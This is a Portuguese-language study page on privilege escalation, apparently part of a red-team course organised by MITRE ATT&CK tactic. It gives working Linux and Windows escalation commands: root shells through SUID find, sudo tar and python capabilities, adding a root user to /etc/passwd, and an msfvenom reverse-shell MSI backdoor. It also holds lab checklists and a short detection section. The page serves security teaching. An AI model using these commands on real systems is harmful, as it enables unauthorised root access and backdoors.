# 06 - Elevação de Privilégios

**MITRE ATT&CK Tactic:** [TA0004 - Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)

## 📖 Sobre

Técnicas para obter **permissões mais altas** no sistema. Geralmente começamos com usuário limitado e precisamos virar root/SYSTEM/Administrator.

## 🎯 Objetivo

Escalar de usuário comum para administrador/root, obtendo controle total do sistema.

## 📚 Técnicas Principais

### T1548 - Abuse Elevation Control Mechanism
- **T1548.001** - Setuid and Setgid (Linux)
- **T1548.002** - Bypass User Account Control (UAC)
- **T1548.003** - Sudo and Sudo Caching
- **T1548.004** - Elevated Execution with Prompt

### T1068 - Exploitation for Privilege Escalation
- Kernel exploits
- CVEs de escalação
- Buffer overflow local

### T1134 - Access Token Manipulation
- Token impersonation
- Token theft (Windows)

### T1055 - Process Injection
- DLL injection
- Process hollowing
- APC injection

### T1078 - Valid Accounts
- Credenciais descobertas
- Password reuse

### T1574 - Hijack Execution Flow
- DLL hijacking
- PATH manipulation

## 🛠️ Vetores de Escalação

### Linux Privilege Escalation

#### SUID/SGID Binaries
```bash
# Encontrar binaries SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# GTFOBins - Explorar binários
# Ex: /usr/bin/find com SUID
find . -exec /bin/bash -p \; -quit
```

#### Sudo Misconfigurations
```bash
# Verificar permissões sudo
sudo -l

# Explorar wildcards
# Se sudo permite: /bin/tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

#### Kernel Exploits
```bash
# Verificar versão do kernel
uname -a
cat /proc/version

# Procurar exploits
searchsploit kernel [version]

# Exemplos conhecidos:
# - DirtyCOW (CVE-2016-5195)
# - Dirty Pipe (CVE-2022-0847)
```

#### Capabilities
```bash
# Listar capabilities
getcap -r / 2>/dev/null

# Explorar python com cap_setuid
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Cron Jobs
```bash
# Verificar cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Procurar scripts writable executados como root
```

#### Writable /etc/passwd
```bash
# Se /etc/passwd é writable
openssl passwd -1 -salt hacker password123
echo 'hacker:$1$hacker$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### Windows Privilege Escalation

#### UAC Bypass
```powershell
# Event Viewer UAC Bypass
# fodhelper.exe UAC Bypass
```

#### Token Impersonation
```powershell
# SeImpersonatePrivilege
# Juicy Potato, Rogue Potato, PrintSpoofer
```

#### Unquoted Service Paths
```powershell
# Encontrar serviços com paths sem aspas
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Explorar
# C:\Program Files\Vulnerable App\service.exe
# Colocar backdoor em: C:\Program.exe
```

#### AlwaysInstallElevated
```powershell
# Verificar registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Se ambos = 1, criar MSI malicioso
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o backdoor.msi
```

#### Scheduled Tasks
```powershell
# Verificar scheduled tasks
schtasks /query /fo LIST /v

# Procurar tasks executadas como SYSTEM com binários writable
```

#### DLL Hijacking
```powershell
# Usar Process Monitor (procmon) para identificar DLLs faltantes
# Criar DLL maliciosa no PATH
```

## 🎓 Labs Práticos

### Linux
- [ ] Explorar SUID binary (find, vim, etc)
- [ ] Sudo misconfiguration
- [ ] Kernel exploit (DirtyCOW em ambiente controlado)
- [ ] Writable cron job
- [ ] Capabilities abuse

### Windows
- [ ] UAC bypass
- [ ] Unquoted service path
- [ ] AlwaysInstallElevated
- [ ] Token impersonation
- [ ] Kernel exploit (MS16-032)

## 🛠️ Ferramentas de Enumeração

### Linux
- **LinPEAS** - Automação completa
- **LinEnum** - Enumeration script
- **Linux Exploit Suggester** - Kernel exploits
- **pspy** - Monitor de processos sem root

### Windows
- **WinPEAS** - Automação completa
- **PowerUp** - PowerShell privesc
- **Sherlock** - Patch checker
- **Watson** - Vulnerability finder
- **PrivescCheck** - PowerShell enumeration

## 📝 Checklist de Enumeração

### Linux
```
[ ] sudo -l
[ ] SUID binaries
[ ] Capabilities
[ ] Cron jobs
[ ] Writable PATH
[ ] Kernel version
[ ] Running processes
[ ] Network connections
[ ] Users and groups
[ ] /etc/passwd, /etc/shadow permissions
```

### Windows
```
[ ] whoami /priv
[ ] net user
[ ] systeminfo
[ ] Unquoted service paths
[ ] AlwaysInstallElevated
[ ] Scheduled tasks
[ ] Startup programs
[ ] Registry autoruns
[ ] Writable services
```

## 🔍 Detecção

### Indicadores
- Tentativas de exploração de kernel
- Modificações em binários SUID
- UAC bypass attempts
- Token manipulation
- Execução de exploits conhecidos

## 📚 Recursos

- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks - PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

---

**Anterior:** [05-Persistencia](../05-Persistencia/) | **Próximo:** [07-EvasaoDefesa](../07-EvasaoDefesa/)